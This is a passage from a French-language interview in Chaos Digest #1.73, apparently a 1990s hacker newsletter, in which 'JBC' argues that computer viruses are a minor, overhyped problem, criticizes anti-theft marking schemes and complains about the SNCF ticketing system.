  lui-meme, ou d'un grand specialiste de l'Eicar ou de l'EFF. Mais plutot que
  de s'occuper des virus, qui est un petit probleme, on prefere tres
  clairement denoncer beaucoup d'abus realises par des pseudo-professionnels.
  Mais de GROS abus. Je vous ai explique celui du marquage. Je pourrais meme
  vous donner des dizaines de noms de societes qui font des "autocollants
  antivol". Soi-disant, ils repercutent le numero des machines volees aux
  constructeurs. J'ai interroge les dix premiers constructeurs de Paris:
  personne n'a eu vent des repercussions de materiel vole. Il faudrait un
  marquage pour l'ecran, pour le clavier, pour l'unite centrale, de plus le
  materiel passe par des intermediaires, grossistes, revendeurs, il est
  revendu... Les constructeurs ne pourraient pas suivre l'ensemble de leurs
  materiels a la trace. Soyons realistes.

RM: Je reviens aux virus. Si j'ai bien compris ce que vous dites, le marche
  des antivirus prospere en fait sur un probleme tout petit.

JBC: Tellement petit qu'il n'y a rien du tout. Dans le livre, il y a ce qu'
  est reellement qu'un virus, comment c'est construit, qu'est-ce qu'il y a
  a l'interieur, comment ca attaque... Et les limites du fantasme! Le vrai
  nom du virus informatique est CPA, code parasite autopropageable.

RM: Que le virus soit une tempete dans un verre d'eau, ce n'est pas une idee
  vraiment habituelle...

JBC: Le bouquin vous montrera, apres que vous ayez analyse quinze virus et
  que vous en ayez ecrit vous-meme, que ce sera toujours limite. D'abord par
  le temps, ensuite par le fait que vous ne pourrez jamais avoir d'idees
  suffisamment originales pour biaiser les systemes de controle, de
  l'antivirus de Dos 6 par exemple. J'ai meme ecrit dans la preface du
  bouquin qui va sortir, qu'a la limite, deux machines PC sur mille sont
  contaminables, en potentiel.

RM: Contaminables?

JBC: C'est-a-dire susceptibles de recevoir l'intrusion d'un virus, en
  globalite en France. Deux pour mille! Est-ce qu'un probleme de deux pour
  mille est a considerer avec autant de force que des problemes plus precis,
  comme l'integration du telex dans le Numeris, l'accession de telles
  ressources, etc. Par exemple, le nouveau systeme de gestion des billets de
  la SNCF, qui me semble plus terrorisant quand on y penseI Avant, je faisais
  l'aller-retour tous les jours de Paris a Lyon. Et ils ont mis en place
  Dagobert, les bornes. La SNCF a mis deux enarques pour y reflechir de
  nouveau. Notre abonnement a l'annee passait avec une formule tellement
  compliquee qu'il etait impossible de monter dans un TGV. Il m'arrivait de
  payer jusqu'a 100 a 120 francs de taxes, surtaxes, amendes, etc. En un
  mois, je me suis retrouve avec mon abonnement (3200 francs) qui couvrait
  globalement une location a Paris, plus les amendes, environ 2000 francs!

RM: C'est une absurdite totale.

JBC: Oui. Alors, je suis alle voir la direction commerciale de la SNCF, ou
  j'ai recu un tres mauvais accueil... J'ai stoppe mon abonnement. Du jour au
  lendemain, ils m'ont perdu, alors que j'etais TGVE, grand voyageur. Et je
  n'ai plus du tout envie. Pourquoi? Parce que ce service est totalement mal
  fait, mal reflechi. Ca me semble donc plus important d'etudier le nouveau
  systeme de reservation SNCF, qui interesse 998 personnes sur mille, que de
  se casser la tete sur un probleme de deux pour mille, celui des virus. On
  s'interesse aux troubles dus aux dysfonctionnements des automates. Et Dieu
  sait s'il y en a! On ne les etudie pas pour embeter les fabricants, mais
  pour montrer que nous aussi on a un processus de reflexion a ce niveau-la.

RM: Vous travaillez avec beaucoup d'entreprises?

JBC: Avec des entreprises, des donneurs d'ordres, des chercheurs. Avec tous
  ceux qui peuvent ameliorer le schmilblic.

RM: Donc, vous avez une certaine credibilite aupres des entreprises. Comment
  expliquer vos problemes avec l'administration?

JBC: Moi, personnellement, je n'ai aucun probleme. Je n'en veux a personne.
  C'est l'administration qui a des problemes avec moi.

RM: On comprend mal pourquoi ils vous en veulent.

JBC: Il faut le leur demander. Je vous avoue que moi-meme, je ne suis pas
  parvenu a avoir de reponse, ce qui est un peu inquietant.

RM: J'ai vu aussi que France Telecom avait une attitude ambigue envers vous.
  Tantot ils vous font des proces, tantot ils vous invitent dans des
  colloques...

JBC: C'est vous-meme qui le dites. Il est vrai que plus l'organisme est
  grand, plus une partie ignore ce que fait l'autre. C'est "tentaculesque"...
  Ca s'appelle la loi de la reticularite. Nous, on essaie de respecter une
  autre loi, celle de l'ethique. On essaie de  reevaluer, ce qui veut dire
  qu'on essaie de trouver, dans le meilleur des cas, la meilleure des
  solutions. C'est etre intelligent dans une situation chaotique.

------------------------------

End of Chaos Digest #1.73
************************************

